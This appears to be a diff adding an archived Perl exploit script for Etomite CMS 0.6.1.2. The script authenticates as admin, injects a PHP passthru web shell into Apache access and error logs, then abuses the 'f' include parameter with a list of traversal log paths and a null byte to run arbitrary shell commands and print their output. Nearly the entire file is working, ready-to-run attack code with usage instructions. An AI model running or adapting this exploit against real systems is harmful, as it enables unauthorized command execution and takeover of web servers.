@@ -1,0 +1,146 @@
+#!/usr/bin/perl -w
+#
+#   Etomite CMS Remote Command Execution
+# Version:  0.6.1.2
+#     Url:  http://www.etomite.org
+# Author :  Alfredo Pesoli 'revenge'
+# Description:
+#
+# Input passed to the 'f' parameter in "/manager/index.php" isn't properly verified before being used in an include function, this can be exploited to include local files on target host or execute command, we need admin credentials to exploit this vuln.
+#
+# http://www.0xcafebabe.it
+# <revenge@0xcafebabe.it>
+
+use strict;
+use IO::Socket;
+
+if ( @ARGV < 5 ) { &usage(); }
+
+my $target   = $ARGV[0];
+my $username = $ARGV[1];
+my $password = $ARGV[2];
+my $path     = $ARGV[3];
+my $cmd	     = "";
+my $cookie   = "";
+my $uagent   = "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Debian)";
+
+for ( my $i=4; $i<=$#ARGV; $i++ ) {
+    $cmd.= "+".$ARGV[$i];
+}
+
+$cookie = &authenticate();
+
+&inject_logfile();
+
+&sploit();
+
+sub authenticate() {
+    my $res;
+    my $tmp;
+
+    print "\n -= Getting auth cookie =-\n\n";
+    my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$target", PeerPort=>"80") or die "\n Could not connect to host\n\n";
+    my $req = "rememberme=0&location=&username=".$username."&password=".$password."&thing=&submit=Login&licenseOK=on";
+    print $sock "POST ".$path."processors/login.processor.php HTTP/1.1\r\n";
+    print $sock "Host: ".$target."\r\n";
+    print $sock "User-Agent: ".$uagent."\r\n";
+    print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+    print $sock "Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+    print $sock "Accept-Encoding: gzip,deflate\r\n";
+    print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+    print $sock "Connection: close\r\n";
+    print $sock "Referer: http://".$target.$path."index.php\r\n";
+    print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
+    print $sock "Content-Length: ".length($req)."\r\n\r\n";
+    print $sock $req;
+
+    while ( $res = <$sock> ) {
+	$tmp.= $res;	
+    }
+    close($sock);
+
+    my @temp	= split /Cookie:/,$tmp;
+    my @cookie	= split /Expires/,$temp[1];
+
+    print " [#] COOKIE: ".$cookie[0]."\n";
+    return $cookie[0];
+}
+
+sub inject_logfile() {
+    print " -= Injecting log files =- \n";
+    my $mal="<?php ob_clean();echo lizardking;passthru(\$_GET[cmd]);echo lizardking;?>";
+    my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$target", PeerPort=>"80") or die "\n Could not connect to host\n\n";
+    print $sock "GET ".$path.$mal." HTTP/1.1\r\n";
+    print $sock "User-Agent: ".$uagent."\r\n";
+    print $sock "Host: ".$target."\r\n";
+    print $sock "Connection: close\r\n\r\n";
+}
+
+sub sploit() {
+    my $res;
+    my $tmp;
+    my $i;
+    
+    my @http_paths= (
+	"../apache/logs/error.log",
+	"../apache/logs/access.log",
+	"../../apache/logs/error.log",
+	"../../apache/logs/access.log",
+	"../../../apache/logs/error.log",
+	"../../../apache/logs/access.log",
+	"../../../../../../../etc/httpd/logs/acces_log",
+	"../../../../../../../etc/httpd/logs/acces.log",
+	"../../../../../../../etc/httpd/logs/error_log",
+	"../../../../../../../etc/httpd/logs/error.log",
+	"../../../../../../../var/www/logs/access_log",
+	"../../../../../../../var/www/logs/access.log",
+	"../../../../../../../usr/local/apache/logs/access_log",
+	"../../../../../../../usr/local/apache/logs/access.log",
+	"../../../../../../../var/log/apache/access_log",
+	"../../../../../../../var/log/apache2/access_log",
+	"../../../../../../../var/log/apache/access.log",
+	"../../../../../../../var/log/apache2/access.log",
+	"../../../../../../../var/log/access_log",
+	"../../../../../../../var/log/access.log",
+	"../../../../../../../var/www/logs/error_log",
+	"../../../../../../../var/www/logs/error.log",
+	"../../../../../../../usr/local/apache/logs/error_log",
+	"../../../../../../../usr/local/apache/logs/error.log",
+	"../../../../../../../var/log/apache/error_log",
+	"../../../../../../../var/log/apache2/error_log",
+	"../../../../../../../var/log/apache/error.log",
+	"../../../../../../../var/log/apache2/error.log",
+	"../../../../../../../var/log/error_log",
+	"../../../../../../../var/log/error.log"
+    );
+
+    for ( $i=0; $i<=$#http_paths; $i++ ) {
+	my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$target", PeerPort=>"80") or die "\n Could not connect to host\n\n";
+	print $sock "GET ".$path."index.php?cmd=".$cmd."&a=1&f=".$http_paths[$i]."%00 HTTP/1.1\r\n";
+	print $sock "Host: ".$target."\r\n";
+	print $sock "Cookie: ".$cookie."\r\n";
+	print $sock "Connection: close\r\n\r\n";
+	
+	while ( $res = <$sock> ) { $tmp.= $res; }
+	close($sock);
+	
+	my @temp = split /lizardking/,$tmp,3;
+	
+	if ( $#temp > 1 ) {
+	    print "\n -= Executing: ".$cmd." =-\n\n [#] Exploit succedeed\n\n".$temp[1]."\n";
+	    exit();
+	}
+    }
+    print "Exploit failed\n\n";
+}
+
+sub usage() {
+    print "\n Etomite CMS 0.6.1.2 Remote Command Execution\n";
+    print " <revenge\@0xcafebabe.it>\n";
+    print " http://www.0xcafebabe.it\n\n";
+    print "Usage: $0 <target> <username> <password> <directory> <command>\n";
+    print "Example: $0 127.0.0.1 admin ghghgh /etomite/manager/ ls -la /\n\n";
+    exit();
+}
+
+# milw0rm.com [2006-11-16]
